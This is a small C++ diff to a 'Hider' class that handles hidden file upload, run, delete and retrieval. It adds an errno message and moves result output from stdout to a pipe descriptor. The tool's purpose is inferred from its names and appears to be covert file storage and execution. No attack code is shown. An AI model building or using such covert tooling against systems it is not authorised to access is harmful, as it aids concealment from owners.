@@ -32,6 +32,7 @@ uint Hider::manage_files(int argc, char* argv[])
 		std::cerr << "start hidden uploading\n";
 		res_upload.status = handel.uploadFile(stringParam, uploadLen);
 		std::cerr << "res_upload: " << res_upload.status << std::endl;
+		std::cerr << "hider: " << strerror(errno) << std::endl;
 
 	}
 	if ((fncode & HIDDEN_RUN) && res_upload.status == SUCCSESS) {
@@ -47,9 +48,9 @@ uint Hider::manage_files(int argc, char* argv[])
 	}
 	if (fncode & (HIDDEN_UPLOAD | HIDDEN_RUN | HIDDEN_DELETE))
 	{
-		write(STDOUT_FILENO, &res_upload, sizeof(res_upload));
-		write(STDOUT_FILENO, &res_run, sizeof(res_run));
-		write(STDOUT_FILENO, &res_delete, sizeof(res_delete));
+		write(OUTPUT_PIPE_FD, &res_upload, sizeof(res_upload));
+		write(OUTPUT_PIPE_FD, &res_run, sizeof(res_run));
+		write(OUTPUT_PIPE_FD, &res_delete, sizeof(res_delete));
 	}
 
 	if(fncode & HIDDEN_RETRIEVE_FILE) {
